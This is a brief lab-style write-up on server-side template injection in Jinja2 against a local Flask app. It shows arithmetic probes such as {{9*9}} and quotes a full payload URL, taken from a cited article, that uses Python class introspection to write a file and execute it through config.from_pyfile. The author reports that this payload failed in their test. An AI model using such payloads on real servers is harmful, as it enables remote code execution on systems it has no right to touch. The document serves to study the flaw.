# Exploit Write Up for Jinja2

For this app we will be leveraging the ability to evalute python expressions in Jinja templates by passing expresions as parameters in a `GET` request to our Flask app.

## Here's what worked

* Using the double braces allows users to run basic math expressions on the server.  
For example:

  * `sample.url/?exploit={{9*9}}` will be evalueted as `81` on the server.

* Using the following expression, `9|string()` we can typecast the integer `9` as a string `"9"` and multiply it with an integer.  Like so:

  * `sample.url/?exploit={{9|string()*2}}` will ouput: `"99"`

## Here's what didn't

* I couldn't find a way to multiply with strings like: `"hello"`

* According to this article on [0day](https://0day.work/jinja2-template-injection-filter-bypasses/), the subsequent request should have resulted in the creation of a new file with `1337` as the first line.
  * ```http://localhost:5000/?exploit={{request.__class__.__mro__[8].__subclasses__()[40](request.args.file,request.args.write).write(request.args.payload)}}{{config.from_pyfile(request.args.file)}}&file=/tmp/foo.py&write=w&payload=print+1337```  
